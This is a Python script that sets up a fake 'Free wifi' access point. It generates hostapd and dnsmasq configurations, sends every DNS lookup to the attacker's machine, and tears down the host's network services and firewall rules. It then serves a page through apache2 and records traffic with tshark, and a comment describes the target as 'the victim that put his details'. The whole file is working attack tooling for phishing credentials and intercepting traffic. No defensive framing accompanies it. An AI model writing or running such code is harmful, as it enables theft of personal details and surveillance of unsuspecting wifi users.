import os

# ============ Configuration Files =======================

def Create_hostapd(iface, ssid="Free wifi", channel=1):
    interface_str= "interface="+str(iface)+"\n"
    driver_str="driver=nl80211\n"
    ssid_str= "ssid="+str(ssid)+"\n"
    channel_str = "channel="+str(channel)+" \n"
    conf_str= interface_str+driver_str+ssid_str+channel_str
    f = open("hostapd.conf", "w+")
    f.write(conf_str)
    os.chmod("hostapd.conf",0o777)

#configure dnsmasq to be used as a DHCP server and DNS server.
def Create_dnsmasq(iface):
    iface_str= "interface="+str(iface)+""
    body_str= "\ndhcp-range=192.168.1.2,192.168.1.250,12h"
    body_str+="\ndhcp-option=3,192.168.1.1"
    body_str+="\ndhcp-option=6,192.168.1.1"
    body_str+="\naddress=/#/192.168.1.1"
    conf_str = iface_str+body_str
    f = open("dnsmasq.conf", "w+")
    f.write(conf_str)
    os.chmod("dnsmasq.conf",0o777)   

def Delete_conf_files():
    os.system("rm *.conf")

# ================== Deploy fake AP ==============================

def init_setting():
    os.system('sudo airmon-ng check kill')
    os.system('service NetworkManager start')
    os.system('service apache2 stop')
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('service NetworkManager stop')
    os.system(' pkill -9 hostapd')
    os.system('sudo pkill -9 dnsmasq')
    os.system(' pkill -9 wpa_supplicant')
    os.system(' pkill -9 avahi-daemon')
    os.system(' pkill -9 dhclient')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

def start(iface):
    os.system('sudo dnsmasq -C dnsmasq.conf')
    os.system('sudo hostapd hostapd.conf -B')
    os.system("sudo ifconfig " + str(iface) + " 192.168.1.1/24")
    os.system("sudo service apache2 start")
    os.system("tshark -i "+ str(iface) +" -w /home/capture/captureAP") #listen to the victim that put his details
